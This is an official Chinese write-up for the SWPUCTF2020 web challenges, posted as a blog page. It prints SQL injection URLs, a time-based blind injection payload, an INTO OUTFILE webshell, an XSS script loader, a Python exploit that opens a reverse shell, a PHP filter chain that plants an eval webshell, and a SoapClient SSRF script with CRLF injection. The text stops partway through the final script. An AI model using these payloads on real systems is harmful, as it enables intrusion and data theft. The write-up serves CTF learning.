

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/08067.jpg">
  <link rel="icon" type="image/png" href="/img/08067.jpg">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="wllm">
  <meta name="keywords" content="">
  <title>SWPUCTF2020 官方WP - SWPU_08067sec</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.1.1"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Wllm's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2020-12-09 19:11" pubdate>
      2020年12月9日 晚上
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      11.1k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      169
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">SWPUCTF2020 官方WP</h1>
            
            <div class="markdown-body" id="post-body">
              <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="359度防护网站"><a href="#359度防护网站" class="headerlink" title="359度防护网站"></a>359度防护网站</h2><h3 id="1-常规解"><a href="#1-常规解" class="headerlink" title="1.常规解"></a>1.常规解</h3><ol>
<li>网站目录下有常见遗留文件robots.txt 与 index.php.bak</li>
</ol>
<p><img src="http://cdn.jev0n.com//mNgWNuGsO0C5TWh2.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p><img src="https://images-cdn.shimo.im/PuYLdw27kJZIyfsd__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>2.bak文件中是base64 解开后得到 important_index_its_so_long_right.php?id=1 页面</p>
<p><img src="http://cdn.jev0n.com//JWAC04xrBNIIo3KB.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>3.在上面得到的页面中直接进行联合注入得到所有数据库名，表，字段及内容</p>
<pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">182.150.46.187:8802</span>/important_index_its_so_long_right.php?id=<span class="hljs-number">1</span>&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA-- -</code></pre>

<p><img src="http://cdn.jev0n.com//s0SEDhdn9LsruJx6.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<ul>
<li><p>分别查询LTLT库和h1nt库得到LTLT库中的login表，里面有pwd,usn，usn 是admin123,pwd是md5,在somd5查询得到 wllm@123</p>
</li>
<li><pre><code>http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39; and 1=2 union select 1,2,3,group_concat(pwd) from login-- -
<pre><code class="hljs markdown">
![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//g6R2P7KinrnVTjco.png!thumbnail</span>)

<span class="hljs-bullet">*</span> h1nt库中是help表，里面有hint，内容是一个页面名，访问后提示先登录，但是并没有给登录地址，所用会话也不是与 administrator.html 相同，所以这条路先暂停
<span class="hljs-bullet">*</span> [<span class="hljs-string">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#x27; and 1=2 union select 1,2,3,group_concat(hint) from h1nt.help-- -</span>](<span class="hljs-link">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#x27; and 1=2 union select 1,2,3,group_concat(hint</span>) from h1nt.help-- -)

![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//TQmhpOesRlwRsEo7.png!thumbnail</span>)

![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//0mIbhjOlPnfAfpag.png!thumbnail</span>)

<span class="hljs-bullet">*</span> 利用得到的 usn和pwd登录进入robots.txt中的 administrator.html

![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//2B03P4zqzX6RnmUq.png!thumbnail</span>)

<span class="hljs-bullet">*</span> 进去后是一个后台，翻看页面后发现无明显可利用点，查看源码发现憨憨开发注释掉的部分

![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//3PY8np9P7bRDRuIR.png!thumbnail</span>)

![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//6sKyTB8ZX1SLwZQF.png!thumbnail</span>)

<span class="hljs-bullet">*</span> 访问 writeuser<span class="hljs-emphasis">_00001_</span>log.log 后得到一页的base64，丢burp解码，找到可疑页面 up<span class="hljs-emphasis">_lo_</span>ad<span class="hljs-emphasis">_ad_</span>min.php

![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//UcCJEOrAEBTOtCbK.png!thumbnail</span>)

<span class="hljs-bullet">*</span> 访问发现要登录，但是只有一条信息需要验证，F12发现有输入长度限制为5，猜测是前面log页面中的user:00001

![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//2x1MFSXYHW1YtGFg.png!thumbnail</span>)

![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//CH2HoV512vHbdVGk.png!thumbnail</span>)

![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//FuX1MfweX6W7PDLZ.png!thumbnail</span>)

<span class="hljs-bullet">*</span> 登录成功后发现是一个文件上传点,很多师傅在这里上传了很久都没成功，其实在现在的开发中，只要合理运用白名单，基本就能防死文件上传，这里文件上传的后端验证就是白名单，只能上传jpg,png,gif，所以理论上无法传马

![<span class="hljs-string">图片</span>](<span class="hljs-link">https://images-cdn.shimo.im/2Lj9BdBvDenYUDMx__thumbnail.png</span>)

<span class="hljs-bullet">*</span> 先上传一个正常图片，得到如下信息

![<span class="hljs-string">图片</span>](<span class="hljs-link">https://images-cdn.shimo.im/e1WiP8ADMnLzlzSL__thumbnail.png</span>)

<span class="hljs-bullet">*</span> 之前在h1nt库中拿到的 last<span class="hljs-emphasis">_index_</span>come<span class="hljs-emphasis">_on_</span>swpu<span class="hljs-emphasis">_ctf.php?id=4 页面现在发现可以进去了，这个页面的登录验证就是用的密码是00001的那个页面，进去后发现可以直接sql注入</span>
<span class="hljs-emphasis">* getshell的常规方法中，利用sql语句的into  outfile并不算罕见，只是由于很多情况下secure_</span>file<span class="hljs-emphasis">_priv并未设置，导致无法进行这类文件读写，但是这在渗透中仍然不应该是被忘记的一种方法，没有尝试就不能凭经验否定这种方法。我们尝试写入一句话，但是考虑到目录可能没有可写权限，我们需要找到一个确定有可写权限的文件夹，很容易联想到上传页面暴漏的文件夹就有可写权限，于是构造语句写入一句话</span>
<span class="hljs-emphasis"></span>
<span class="hljs-emphasis">![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//mNQnyuHQPrPE5mBX.png!thumbnail</span>)</span>
<span class="hljs-emphasis"></span>
<span class="hljs-emphasis">![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//n0gGRcfDFyYg0Pr5.png!thumbnail</span>)</span>
<span class="hljs-emphasis"></span>
<span class="hljs-emphasis">* 利用木马文件进行命令执行system(&#x27;cat /flag&#x27;);即可获得flag</span>
<span class="hljs-emphasis"></span>
<span class="hljs-emphasis">![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//Z54hDTIq7Hd4GG0D.png!thumbnail</span>)</span>
<span class="hljs-emphasis"></span>
<span class="hljs-emphasis">![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//M3gn6mgsHFGCeUFJ.png!thumbnail</span>)</span>
<span class="hljs-emphasis"></span>
<span class="hljs-emphasis">### 2.非预期</span>
<span class="hljs-emphasis"></span>
<span class="hljs-emphasis">* 出题时本意是在前台页面用WAF防死SQL注入，但是由于WAF版本未及时更新，有少数师傅用load_</span>file将文件暴力读取了,类似这种

![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//Z16ge7NNThjWcN8y.png!thumbnail</span>)

<span class="hljs-section">## sqlsqlsql</span>

<span class="hljs-section">### 前言</span>

此题参考了第三届CBCTF的sql-labs

<span class="hljs-section">### 过滤</span>

自己测试可以发现如下过滤

![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//xeM5wxMY44vQQBES.png!thumbnail</span>)

![<span class="hljs-string">图片</span>](<span class="hljs-link">http://cdn.jev0n.com//iLUlosx7Xaanl1RY.png!thumbnail</span>)

<span class="hljs-section">### 解题思路</span>

users表字段 id name emile salary

flllag表字段 id asuazttaz

查看源码可以获得提示

<span class="hljs-code">```xml</span>
<span class="hljs-code">&lt;!-- select * from users where id = &#x27;$id&#x27;--&gt;</span></code></pre>
</code></pre>
</li>
</ul>
<p>这个提示是想说明要闭合id字段的引号<br>结合页面的英文提示，很容易想到这个题是时间盲注</p>
<h4 id="需要注意的点"><a href="#需要注意的点" class="headerlink" title="需要注意的点"></a>需要注意的点</h4><ol>
<li>用异或来闭合引号</li>
<li>case when then else end来替代if</li>
<li>用join多个大表造成延时</li>
<li>通过mysql5.7的sys.schema_table_statistics_with_buffer表查询表名</li>
<li>通过无列名注入获取字段内容</li>
<li>通过括号，或者引号包裹来代替空格</li>
<li>flllag表有两个字段且flag值在第二个字段</li>
<li>通过like或者regexp来匹配结果（但是这里不能用like，师傅们结合flag内容具体想想，卖个关子）</li>
</ol>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>两秒左右的延时</p>
<p>查表名</p>
<pre><code class="hljs plain">http:&#x2F;&#x2F;182.150.46.187:8801&#x2F;ttttt&#x2F;?id&#x3D;1&#39;^(select(case&#39;1&#39;when((select(select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema&#x3D;database()))regexp&quot;flllag&quot;))then&#39;1&#39;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end))^&#39;1</code></pre>

<p>查字段内容</p>
<pre><code class="hljs plain">http:&#x2F;&#x2F;182.150.46.187:8801&#x2F;ttttt&#x2F;?id&#x3D;1&#39;^(select(case&#39;1&#39;when((select(select(group_concat(&#96;2&#96;))from(select*from(select(1))as&#96;a&#96;join(select(2))as&#96;b&#96;union(select*from(flllag)))as&#96;a&#96;)regexp&quot;flag&#123;aaa&quot;))then&#39;1&#39;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end))^&#39;1</code></pre>

<p>脚本就不给了，因为这个题是0解，师傅们看payload自己重新做吧<br>题目环境会开放几天的</p>
<p>flag{blind_1nj3ct10n_1s_very_s1mpl3}</p>
<h2 id="太极"><a href="#太极" class="headerlink" title="太极"></a>太极</h2><p>简单测试发现注册处存在无过滤xss漏洞，注册时插入payload</p>
<p>用户名：<script src=[https://xxx](https://xxxxxxx).xss.ht></script>  密码随意</p>
<p>管理员会定期刷新页面，但是由于设置了httponly，不能直接获取cookie</p>
<p>可以看到：</p>
<p><img src="http://cdn.jev0n.com//8pUCSFkixan0K5tp.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p><img src="http://cdn.jev0n.com//MTSoi5D81fKG94QZ.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>当我们直接访问这个ssrf_for_test.php时提示“权限不足”，但我们可以借助管理员的身份来触发这个ssrf，即是通过xss+csrf发起一个ssrf请求，提示也告诉flag在redis的flag字段，我们只要抓一下这个数据包，构造出这个过程，然后去接收返回结果就行。(网上已有很多资料，ssrf打redis等等)</p>
<p><img src="http://cdn.jev0n.com//jmlVlGtoGbTnYZVq.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>注册用户 </p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;[http://xxxxxxxxx/getflag.js](http://xxxxxxxxx/getflag.js)&gt;&lt;/script&gt;</span></span></code></pre>

<p>监听一哈 python3 -m http.server   9999</p>
<p>上个厕所回来就看到flag</p>
<h2 id="noobpy"><a href="#noobpy" class="headerlink" title="noobpy"></a><strong>noobpy</strong></h2><p>发现</p>
<p><img src="http://cdn.jev0n.com//auXxNzdS46ayFlp9.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>内存在命令注入</p>
<p>或者尝试报错也能发现。</p>
<p><img src="http://cdn.jev0n.com//vQbvBUnrGvKjX2Pe.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>将request的[]重载为exec实现命令执行，并且用UA头来注入</p>
<p>反弹shell拿到flag</p>
<p>Exp:</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 
url =<span class="hljs-string">&quot;http://192.168.31.51:6061/Equ.php&quot;</span>
 
s= requests.Session()
 
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">poc1,poc2</span>):</span>
    data = &#123;
        <span class="hljs-string">&quot;left&quot;</span>:poc1+<span class="hljs-string">&quot;1&quot;</span>,
        <span class="hljs-string">&quot;right&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>
    &#125;
    header = &#123;
        <span class="hljs-string">&quot;User-Agent&quot;</span>:poc2
    &#125;
    req = s.post(url,data=data,headers=header)
    <span class="hljs-keyword">print</span> req.text
<span class="hljs-comment">#exp(&#x27;__builtins__.eval=__builtins__.exec#&#x27;,&quot;xxx&quot;)</span>
exp(<span class="hljs-string">&quot;request.__class__.__getitem__=__builtins__.exec;request[request.user_agent.string];&quot;</span>,<span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.91.1&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span>)</code></pre>

<h2 id="原谅最光荣"><a href="#原谅最光荣" class="headerlink" title="原谅最光荣"></a>原谅最光荣</h2><p>ps: 来自真实环境，稍微增加了一点CTF特色</p>
<p>1.打开题目链接，点开页面上的几个链接发现路由是xxx.action会以为是java，扫描或者是常识访问到robots.txt</p>
<p><img src="http://cdn.jev0n.com//r0kDMSbQPPgyk4nU.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>可以看到是php的，题目提到包容二字以及从这几个路径可以推断该题目是伪静态+文件包含，至于是本地还是远程需要进一步验证：</p>
<p>访问：/.%2f.%2f.%2fpricing.action，返回对应pricing.action页面，说明可以拼接路径，但是测试无法跳转，尝试包含/etc/passwd、日志、/proc/self/也无结果，这时可以尝试远程文件包含：</p>
<p>访问：<code>/http:%2f%2fwww.baidu.com.action</code>，截图如下：</p>
<p><img src="http://cdn.jev0n.com//7eUYc2DS1GX4y96Z.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>结果触发了规则，注意看http:/www 中间少了个斜线，然后看代码，发现对path进行了url解码，所以可以在传入路径时使用<code>http:%252f%2fwww.baidu.com</code>来绕过这个问题。</p>
<p>继续看代码，下面对path开头的几个字符做了检测，这里被检测的字符串数组内容未知。由于php能用的伪协议就那么几种，挨个测试即可。</p>
<p>最后发现可以用php://filter包含本地文件获得源码：</p>
<p><a href="view-source:http://47.116.79.40:32773/php:%252f%252ffilter/convert.base64-encode/resource=contact.action">http://47.116.79.40:32773/php:%252f%252ffilter/convert.base64-encode/resource=contact.action</a></p>
<p><img src="http://cdn.jev0n.com//RYmhEtnwA5kudmQ8.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>但是这里是无法通过这个来读取到flag的，因为前面测试可以知道该网站代码会对path添加一个文件后缀然后包含，所以这个题应该是需要获取webshell才能拿到flag。</p>
<p>这里我们可以用resource=<a target="_blank" rel="noopener" href="http://xxx.xxx.com/xxx">http://xxx.xxx.com/xxx</a>来包含远程文档，但是测试可知无法包含外网资源，只能包含localhost（注意末尾加%23来绕过文件后缀）：</p>
<p><a target="_blank" rel="noopener" href="http://47.116.79.40:32773/php:%252f%252ffilter%2fconvert.base64-encode%2fresource=http:%252f%252f127.0.0.1/%23.action">http://47.116.79.40:32773/php:%252f%252ffilter%2fconvert.base64-encode%2fresource=http:%252f%252f127.0.0.1/%23.action</a></p>
<p><img src="http://cdn.jev0n.com//NktMC069HaYgMx6t.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>（这样是没有问题的）</p>
<p>然后在页面可以找到一个contact.action存在一个GET型表单，提交的值可以在输出中打印出来，但是值被实体化了（无法在页面显示出&lt;&gt;等符号）。</p>
<p><img src="https://images-cdn.shimo.im/3cTaUesE82gdpcoy__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>这里的思路是通过base64-decode来将我们传入的base64字符串解成&lt;?php的代码，从而绕过htlm实体化编码，但是convert.base64-decode这个过滤器相对base64-decode函数来说比较古怪，在字符中间遇到等号会直接报错。</p>
<p>这里去除等号的方法可能不唯一，我选择使用简单的utf-7编码，编码规则可以自行查看wiki，大体上是字母数字和个别符号属于直接编码，也就是直接输出；而等号属于可选的直接编码字符，一般会进行base64然后成为这种：-Iwo+。最后payload为：</p>
<pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">47.116.79.40:32773</span>/php%<span class="hljs-number">3</span>A%<span class="hljs-number">252</span>F%<span class="hljs-number">2</span>Ffilter%<span class="hljs-number">2</span>Fconvert.iconv.utf-<span class="hljs-number">8</span>.utf-<span class="hljs-number">7</span>%<span class="hljs-number">2</span>Fconvert.base<span class="hljs-number">64</span>-decode%<span class="hljs-number">2</span>fresource%<span class="hljs-number">3</span>Dhttp:%<span class="hljs-number">252</span>f/localhost/contact.action%<span class="hljs-number">3</span>fname=xxPD<span class="hljs-number">9</span>waHAgZXZhbCgkX<span class="hljs-number">0</span>dFVFsxMjNdKTs%<span class="hljs-number">252</span>fPg%<span class="hljs-number">23</span>.action?<span class="hljs-number">123</span>=echo+%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ch<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Epwned!!!%<span class="hljs-number">3</span>C/h<span class="hljs-number">1</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>;</code></pre>

<p>格式化一下：</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.116</span>.<span class="hljs-number">79.40</span>:<span class="hljs-number">32773</span><span class="hljs-regexp">/php:/</span><span class="hljs-regexp">/filter/</span>convert.iconv.utf-<span class="hljs-number">8</span>.utf-<span class="hljs-number">7</span><span class="hljs-regexp">/convert.base64-decode/</span>resource=http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/contact.action?name=xxPD9waHAgZXZhbCgkX0dFVFsxMjNdKTs/</span>Pg<span class="hljs-comment">#.action?123=echo+&quot;&lt;h1&gt;pwned!!!&lt;/h1&gt;&quot;;</span></code></pre>

<p>访问结果：</p>
<p><img src="https://images-cdn.shimo.im/wsOp6ZcyQaigYOW0__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>值得注意的是，经过base64编码payload的偏移量必须为4的整数倍，因为base64解码是以4字节一组进行转换。</p>
<p>拿到shell后，flag.txt在根目录可以看到。</p>
<h2 id="重来"><a href="#重来" class="headerlink" title="重来"></a>重来</h2><p>访问网站，是个登陆</p>
<p><img src="https://images-cdn.shimo.im/SyslTmLrOKUiV7qO__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>登陆处发现login.js</p>
<p><a href="mailto:&#x74;&#101;&#115;&#116;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#109;">&#x74;&#101;&#115;&#116;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#109;</a> test登录</p>
<p><img src="https://images-cdn.shimo.im/DQAKRGTWoxXXTZI5__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>更改user为admin，访问，越权成功</p>
<p><a target="_blank" rel="noopener" href="http://192.144.157.29:8080/a.php?classname=index&param2=admin">http://xxxx.xxx.xxx.xx/a.php?classname=index&amp;param2=admin</a></p>
<p>发现地址发生了变化并且多了一个隐藏的表单</p>
<p><img src="https://images-cdn.shimo.im/bRjMeqFrp32UYLhe__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>提交id=1</p>
<p><img src="https://images-cdn.shimo.im/3fKD7v5d8Q4im5Zi__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>提示要127.0.0.1，那就是需要ssrf了，观察登陆时的url</p>
<p><a target="_blank" rel="noopener" href="http://192.144.157.29:8080/a.php?classname=login&param2=1">http://192.144.157.29:8080/a.php?classname=login&amp;param2=1</a></p>
<p>classname是一个类名字，param2是这个类的第2个参数，这里存在一个任意对象实列化漏洞，输入一个不存在的类</p>
<p><img src="https://images-cdn.shimo.im/N5m77uXBTPKNKXzh__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>输入php的内置类Exception</p>
<p><img src="https://images-cdn.shimo.im/cmmkvmvtKbfliW1a__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>内置类SimpleXMLElement</p>
<p><img src="https://images-cdn.shimo.im/CJhHWjX8uHheYJQA__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>2者都报第二个参数错误，应该是第一个参数被固定了，结合ssrf，想到了内置类soapClient,验证</p>
<pre><code class="hljs asciidoc"><span class="hljs-link">http://xxxxxxx/a.php?classname=soapclient&amp;param2</span>[<span class="hljs-string">location</span>]=<span class="hljs-link">http://vps/&amp;param2</span>[<span class="hljs-string">uri</span>]=1231</code></pre>

<p><img src="https://images-cdn.shimo.im/RtanIUbcbpv7DIMc__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>但soapclient只能传递get参数，post为自己生成的xml数据，不可控，但soapclient可以自己配置部分请求头如user_agent，并且存在CRLF问题，比如</p>
<p><img src="https://images-cdn.shimo.im/dgoU7Y2sIGnpE0I0__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>构造一个post请求,注意带上cookie</p>
<pre><code class="hljs plain">http:&#x2F;&#x2F;xxxx&#x2F;a.php?classname&#x3D;soapclient&amp;param2[location]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;new_adminuser.php&amp;param2[user_agent]&#x3D;aa%0d%0aCookie:%20isadmin&#x3D;1;flag&#x3D;1%0d%0aContent-Type:%20application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:%20367%0d%0a%0d%0aid&#x3D;1%26a&#x3D;&amp;param2[uri]&#x3D;123</code></pre>

<p><img src="https://images-cdn.shimo.im/s3YJTHnLxtD7w7gi__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>更改vps为127.0.0.1，仍然没有flag</p>
<p><img src="https://images-cdn.shimo.im/0TcaGmGOkB7lW4vC__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>id参数可能是个注入，尝试注入payload</p>
<p><img src="https://images-cdn.shimo.im/OiIFWg61E4onnpuL__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>存在注入，注入脚本</p>
<pre><code class="hljs plain">import requests
#url_template&#x3D;&quot;http:&#x2F;&#x2F;xxxxxx&#x2F;a.php?classname&#x3D;soapclient&amp;param2[location]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;new_adminuser.php&amp;param2[user_agent]&#x3D;aa%0d%0aCookie:%20isadmin&#x3D;1;flag&#x3D;1%0d%0aContent-Type:%20application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:%20367%0d%0a%0d%0aid&#x3D;1%27%20and ascii(substr(database(),&#123;&#125;,1))&#x3D;&#123;&#125;%23%26a&#x3D;&amp;param2[uri]&#x3D;123&quot;
#数据库名user
#url_template&#x3D;&quot;http:&#x2F;&#x2F;xxxxxxxx&#x2F;a.php?classname&#x3D;soapclient&amp;param2[location]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;new_adminuser.php&amp;param2[user_agent]&#x3D;aa%0d%0aCookie:%20isadmin&#x3D;1;flag&#x3D;1%0d%0aContent-Type:%20application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:%20367%0d%0a%0d%0aid&#x3D;1%27%20and ascii(substr((SELECT group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;0x75736572),&#123;&#125;,1))&#x3D;&#123;&#125;%23%26a&#x3D;&amp;param2[uri]&#x3D;123&quot;
#表名flag
#url_template&#x3D;&quot;http:&#x2F;&#x2F;xxxxxxxx&#x2F;a.php?classname&#x3D;soapclient&amp;param2[location]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;new_adminuser.php&amp;param2[user_agent]&#x3D;aa%0d%0aCookie:%20isadmin&#x3D;1;flag&#x3D;1%0d%0aContent-Type:%20application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:%20367%0d%0a%0d%0aid&#x3D;1%27%20and ascii(substr((SELECT group_concat(column_name) FROM information_schema.columns where table_name&#x3D;0x666c6167 ),&#123;&#125;,1))&#x3D;&#123;&#125;%23%26a&#x3D;&amp;param2[uri]&#x3D;123&quot;
#字段名flaaagggg
url_template&#x3D;&quot;http:&#x2F;&#x2F;xxxxx&#x2F;a.php?classname&#x3D;soapclient&amp;param2[location]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;new_adminuser.php&amp;param2[user_agent]&#x3D;aa%0d%0aCookie:%20isadmin&#x3D;1;flag&#x3D;1%0d%0aContent-Type:%20application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:%20367%0d%0a%0d%0aid&#x3D;1%27%20and ascii(substr((select group_concat(flaaagggg) from flag),&#123;&#125;,1))&#x3D;&#123;&#125;%23%26a&#x3D;&amp;param2[uri]&#x3D;123&quot;
​
#payloads&#x3D;&#39;abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ\,_\&#123;\&#125;&#39;
payloads &#x3D; &#39;abcdefghigklmnopqrstuvwxyz,\&#123;\&#125;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!#$%^&amp;*()-+@_.&#39;
​
database_name&#x3D;&#39;&#39;
for j in range(1,50):
    for i in payloads:
        i_ascii&#x3D;ord(i)
